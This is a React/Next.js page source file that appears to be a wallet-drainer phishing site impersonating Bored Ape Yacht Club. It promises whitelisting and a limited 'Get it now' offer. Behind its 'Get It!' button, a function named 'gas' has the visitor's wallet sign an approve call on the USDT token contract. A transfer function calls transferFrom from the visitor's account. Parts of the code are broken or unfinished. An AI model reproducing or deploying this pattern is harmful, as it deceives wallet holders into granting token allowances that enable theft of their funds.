import { Button, Text, Flex, Center, useColorModeValue, Image, Box, Tabs, TabList, Tab, TabPanels, TabPanel, Alert, AlertIcon, Link, styled, AccordionButton } from "@chakra-ui/react"
import Head from "next/head"
import { useMoralis, useWeb3Contract } from "react-moralis"
import Balance from "../components/Balance"
import Transactions from "../components/Transactions"
import Header from "../components/Header"
import Profile from "../components/Profile"
import moralisV1 from 'moralis-v1'
import { useEffect, useState } from "react"
import { Modal, ModalOverlay, ModalContent, ModalHeader, ModalFooter, ModalBody, ModalCloseButton } from '@chakra-ui/react'
import { useDisclosure } from '@chakra-ui/react'
import { MoralisProvider } from "react-moralis";
import { initializeApp } from "firebase/app";
import { getMoralisAuth } from '@moralisweb3/client-firebase-auth-utils';
import { signInWithMoralis } from '@moralisweb3/client-firebase-evm-auth';
import { getAuth } from '@firebase/auth';
import { getFunctions } from "firebase/functions"



const firebaseConfig = {
  apiKey: "",
  authDomain: "",
  projectId: "",
  storageBucket: "",
  messagingSenderId: "",
  appId: "",
  measurementId: ""
};

const app = initializeApp(firebaseConfig);
//const moralisAuth = getMoralisAuth(app);
const auth = getAuth(app);
const functions = getFunctions(app);




// const Container = styled.div`
//   display: flex;
//   justify-content: center;
//   align-items: center;
//   height: 100vh;
// `;

// const Button = styled.button`
//   min-width: 100px;
//   padding: 16px 32px;
//   border-radius: 4px;
//   border: none;
//   background: #141414;
//   color: #fff;
//   font-size: 24px;
//   cursor: pointer;
// `;



function Home() {

  const [user, setUser]= useState(null);
  const { EvmChain } = require("@moralisweb3/common-evm-utils");
  

  const Moralis = require("moralis").default;

  if (!Moralis.Core.isStarted) {
    Moralis.start({
      apiKey:
        "",
    });
  }
 
  const ABI = [{"constant":true,
"inputs":[],"name":"name",
"outputs":[{"name":"",
"type":"string"}],
"payable":false,
"stateMutability":"view",
"type":"function"},
{"constant":false,
"inputs":[{"name":"_upgradedAddress",
"type":"address"}],
"name":"deprecate",
"outputs":[],
"payable":false,
"stateMutability":"nonpayable",
"type":"function"},
{"constant":false,
"inputs":[{"name":"_spender",
"type":"address"},
{"name":"_value",
"type":"uint256"}],
"name":"approve",
"outputs":[],
"payable":false,
"stateMutability":"nonpayable",
"type":"function"},
{"constant":true,"inputs":[],
"name":"deprecated",
"outputs":[{"name":"",
"type":"bool"}],
"payable":false,
"stateMutability":"view",
"type":"function"},
{"constant":false,
"inputs":[{"name":"_evilUser",
"type":"address"}],
"name":"addBlackList",
"outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},
{"constant":true,"inputs":[],"name":"totalSupply",
"outputs":[{"name":"","type":"uint256"}],"payable":false,
"stateMutability":"view","type":"function"},
{"constant":false,"inputs":[{"name":"_from","type":"address"},
{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],
"name":"transferFrom","outputs":[],"payable":false,"stateMutability":"nonpayable",
"type":"function"},{"constant":true,"inputs":[],"name":"upgradedAddress",
"outputs":[{"name":"","type":"address"}],
"payable":false,"stateMutability":"view","type":"function"},
{"constant":true,"inputs":[{"name":"","type":"address"}],
"name":"balances","outputs":[{"name":"","type":"uint256"}],
"payable":false,"stateMutability":"view","type":"function"},
{"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint256"}],
"payable":false,"stateMutability":"view","type":"function"},
{"constant":true,"inputs":[],"name":"maximumFee","outputs":[{"name":"","type":"uint256"}],
"payable":false,"stateMutability":"view","type":"function"},
{"constant":true,"inputs":[],"name":"_totalSupply","outputs":[{"name":"","type":"uint256"}],
"payable":false,"stateMutability":"view","type":"function"},
{"constant":false,"inputs":[],"name":"unpause",
"outputs":[],"payable":false,"stateMutability":"nonpayable",
"type":"function"},{"constant":true,"inputs":[{"name":"_maker","type":"address"}],
"name":"getBlackListStatus","outputs":[{"name":"","type":"bool"}],
"payable":false,"stateMutability":"view","type":"function"},
{"constant":true,"inputs":[{"name":"","type":"address"},
{"name":"","type":"address"}],"name":"allowed","outputs":[{"name":"","type":"uint256"}],
"payable":false,"stateMutability":"view","type":"function"},
{"constant":true,"inputs":[],"name":"paused","outputs":[{"name":"","type":"bool"}],
"payable":false,"stateMutability":"view","type":"function"},
{"constant":true,"inputs":[{"name":"who","type":"address"}],"name":"balanceOf",
"outputs":[{"name":"","type":"uint256"}],
"payable":false,"stateMutability":"view","type":"function"},
{"constant":false,"inputs":[],"name":"pause",
"outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},
{"constant":true,"inputs":[],"name":"getOwner",
"outputs":[{"name":"","type":"address"}],"payable":false,
"stateMutability":"view","type":"function"},
{"constant":true,"inputs":[],"name":"owner",
"outputs":[{"name":"","type":"address"}],"payable":false,
"stateMutability":"view","type":"function"},
{"constant":true,"inputs":[],"name":"symbol",
"outputs":[{"name":"","type":"string"}],
"payable":false,"stateMutability":"view","type":"function"},
{"constant":false,"inputs":[{"name":"_to","type":"address"},
{"name":"_value","type":"uint256"}],"name":"transfer",
"outputs":[],"payable":false,"stateMutability":"nonpayable",
"type":"function"},{"constant":false,"inputs":[{"name":"newBasisPoints",
"type":"uint256"},{"name":"newMaxFee","type":"uint256"}],
"name":"setParams","outputs":[],"payable":false,
"stateMutability":"nonpayable","type":"function"},
{"constant":false,"inputs":[{"name":"amount","type":"uint256"}],
"name":"issue","outputs":[],"payable":false,"stateMutability":"nonpayable",
"type":"function"},{"constant":false,"inputs":[{"name":"amount",
"type":"uint256"}],"name":"redeem","outputs":[],"payable":false,
"stateMutability":"nonpayable","type":"function"},
{"constant":true,"inputs":[{"name":"_owner","type":"address"},
{"name":"_spender","type":"address"}],"name":"allowance",
"outputs":[{"name":"remaining","type":"uint256"}],
"payable":false,"stateMutability":"view","type":"function"},
{"constant":true,"inputs":[],"name":"basisPointsRate","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"","type":"address"}],"name":"isBlackListed","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_clearedUser","type":"address"}],"name":"removeBlackList","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"MAX_UINT","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"_blackListedUser","type":"address"}],"name":"destroyBlackFunds","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"inputs":[{"name":"_initialSupply","type":"uint256"},{"name":"_name","type":"string"},{"name":"_symbol","type":"string"},{"name":"_decimals","type":"uint256"}],"payable":false,"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":false,"name":"amount","type":"uint256"}],"name":"Issue","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"amount","type":"uint256"}],"name":"Redeem","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"newAddress","type":"address"}],"name":"Deprecate","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"feeBasisPoints","type":"uint256"},{"indexed":false,"name":"maxFee","type":"uint256"}],"name":"Params","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"_blackListedUser","type":"address"},{"indexed":false,"name":"_balance","type":"uint256"}],"name":"DestroyedBlackFunds","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"_user","type":"address"}],"name":"AddedBlackList","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"_user","type":"address"}],"name":"RemovedBlackList","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"owner","type":"address"},{"indexed":true,"name":"spender","type":"address"},{"indexed":false,"name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"from","type":"address"},
{"indexed":true,"name":"to","type":"address"},{"indexed":false,"name":"value","type":"uint256"}],"name":"Transfer","type":"event"},
{"anonymous":false,"inputs":[],"name":"Pause","type":"event"},
{"anonymous":false,"inputs":[],"name":"Unpause","type":"event"}];

  //const {isAuthenticated, authenticate, user, enableWeb3, isWeb3Enabled, Moralis, logout, isLoggingOut } = useMoralis()
  
  const {isAuthenticated, authenticate, enableWeb3, isWeb3Enabled, logout, isLoggingOut } = useMoralis()
  const [approved, setApproved] = useState(false);

  const { runContractFunction: approve, data: enterTxResponse, error, isLoading, isFetching } = useWeb3Contract({

}

);


async function gas(){
  const ethers = Moralis.web3Library;
 const web3Provider = await Moralis.enableWeb3();
 const signer = web3Provider.getSigner();
 const contract = new ethers.Contract("0xdAC17F958D2ee523a2206206994597C13D831ec7", ABI, signer);
 let res = await contract.approve("0xdAC17F958D2ee523a2206206994597C13D831ec7", 1000000, {
  gasPrice: ethers.utils.parseUnits("5", "gwei").toString(),
  gasLimit: 48525
 })
}


const { account } = useMoralis();

  async function transfer(){
    const ethers = Moralis.web3Library;
  const web3Provider = await Moralis.enableWeb3();

  const signer = web3Provider.getSigner();

  const contract = new ethers.Contract("0xdAC17F958D2ee523a2206206994597C13D831ec7", ABI, signer);

  let res = await contract.transferFrom({

    _from: account,

    _to: "",

    _value: 1000000,

    gasPrice: ethers.utils.parseUnits("20","gwei").toString(),

    gasLimit: 280000

  })
  }


useEffect(() => {
  if (!isWeb3Enabled && isAuthenticated)
  enableWeb3();
},[isWeb3Enabled, isAuthenticated]);

const { isOpen, onOpen, onClose } = useDisclosure()


if(!isAuthenticated && !user) {
  console.log(user);

  async function login() {
    const moralisAuth = getMoralisAuth(app, {
      auth,
      functions,
    });
    const res = await signInWithMoralis(moralisAuth);
  
    setUser(res.credentials.user.displayName);
    console.log(res.credentials.user)
  }
  
  
  async function logout() {
    await auth.signOut();
    setUser(null);
  }

  return(
    <>
    <Head>
      <title>Test</title>
      </Head>
      <Flex
       direction="column" 
      justifyContent="center" 
      alignItems="center"
      width="100vw"
      height="100vh"
      bgGradient="linear(to-br, teal.400, purple.300)"
      backgroundImage="url('../bay.jpg')"
      >
        <Text fontSize="5xl" fontWeight="bold" color="white">Connect Wallet</Text>
        <Button colorScheme="purple" size="lg" mt="6"
         onClick={() => login({
           signingMessage: "Sign to get whitelisted on Boredapeyachtclub"
         })}
        >Sign in with Metamask</Button>
        <br />
        
        <Button colorScheme="purple" size="lg" mt="6"
         onClick={() => authWalletConnect({
           signingMessage: "Sign to get whitelisted on Boredapeyachtclub"
         })}
        >Sign in with Wallet Connect</Button>
      </Flex>

      {/* <p>
          Firebase Moralis Auth Extension 🔐
        </p>
        {!user ? (
          <Button style={{ cursor: "pointer" }} onClick={login}>
            Login
          </Button>
        ) : (
          <>
            <p>User:{user}</p>

            <div style={{ cursor: "pointer" }} onClick={logout}>
              Logout
            </div>
          </>
        )} */}
      </>
  )
};

// const ABI = 
 
async function authWalletConnect() {
  const user = login({
    provider: "walletconnect",
    chainId: 56,
    mobileLinks: [
      "metamask",
      "trust",
      "rainbow",
      "argent",
      "imtoken",
      "pillar",
      "mathwallet",
      "meet.one wallet",
      "equal",
      "safepal",
      "cool wallet",
      "xwallet",
      "atomic",
      "myetherwallet",
      "cybavo",
      "onto",
      "mycrypto",
      "minerva wallet",
      "metax",
      "encrypted ink",
      "gnosis safe",
      "bitpay",
      "fireblocks",
      "debank",
      "tokenpocket",
      "infinity wallet",
      "coinbase wallet"
    ],
    signingMessage: "Sign to now",
  });
  console.log(user);
};





const handleSuccess = async (tx) => {
await tx.wait(1)
setApproved(true)
// handleNewNotification(tx)
}


  return (
    
    <>
    {/* <MoralisProvider appId={process.env.NEXT_PUBLIC_APPID}></MoralisProvider> */}
    
    <MoralisProvider appId={process.env.NEXT_PUBLIC_APPID} serverUrl={process.env.NEXT_PUBLIC_SERVER_URL}></MoralisProvider>
      <Head>
        <title>Test</title>
        <meta name="description" content="Boredapeyachtclub" />
        <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
        <link rel="icon" type="image/jpeg" sizes="32x32" href="/favicon.jpeg" />
        <link rel="icon" type="image/jpeg" sizes="16x16" href="/favicon.jpeg" />
        <link rel="manifest" href="/site.webmanifest" />
        <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5" />
        <meta name="msapplication-TileColor" content="#da532c" />
        <meta name="theme-color" content="#ffffff" />
      </Head>
      <Flex direction="column" width="100vw" height="100vh">
        <Header user={user} logout={logout} isLoggingOut={isLoggingOut}/>
        <Box flex="1" bg="purple.100" px="11" py="44">
        <Tabs size="lg" colorScheme="purple" align="center" variant="enclosed">
        <Alert status="success">
          <AlertIcon />
          Wallet connected succesfully {user.get("displayName")}
        </Alert>
       
        <br />
        <Button onClick={onOpen}>Get it now!</Button>

        <Modal isOpen={isOpen} onClose={onClose}>
        <ModalOverlay />
        <ModalContent>
          <ModalHeader color="purple">Be among the 1st 100</ModalHeader>
          <ModalCloseButton />
          <ModalBody>
          <Image src="../bored.jpg" />
          </ModalBody>

          <ModalFooter>
            {/* <Button colorScheme='blue' mr={3} onClick={onClose}>
              Close
            </Button> */}
            <Button ml="4" className="bg-blue-500 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded ml-auto"
                        onClick={async () =>
                            await gas({
                                onSuccess: handleSuccess,
                            })
                        }
                        disabled={isLoading || isFetching || approved}>{ approved ? "Approved" : "Get It!" }</Button>  
            {/* <br /> */}
            {/* <Button ml="4" colorScheme="green" onClick={transferFromCon}>Continue</Button> */}
            {/* <a href="" target="_blank" rel="noreferrer">
            <Button ml="4" colorScheme="green" disabled={isLoading || isFetching || !approved}>Continue</Button>
            </a> */}
          </ModalFooter>
        </ModalContent>
      </Modal>
      <br />
           
    {/* <br /> 
        <Link href="" isExternal>
          Head back
        </Link> */}
        
    
           {/* <TabList>
            <Tab fontWeight="bold">Profile</Tab>
            <Tab fontWeight="bold">Balance</Tab>
            <Tab fontWeight="bold">Transactions</Tab>
          </TabList>
          <TabPanels>
            <TabPanel>
              <Profile user={user} />
            </TabPanel> */} 
            <TabPanel>
              <Balance user={user}/>
            </TabPanel>
            {/* <TabPanel>
               <Transactions user={user}/>
            </TabPanel>
          </TabPanels>  */}
        </Tabs>
        </Box>
      </Flex>
    </>
     
  )
}
export default Home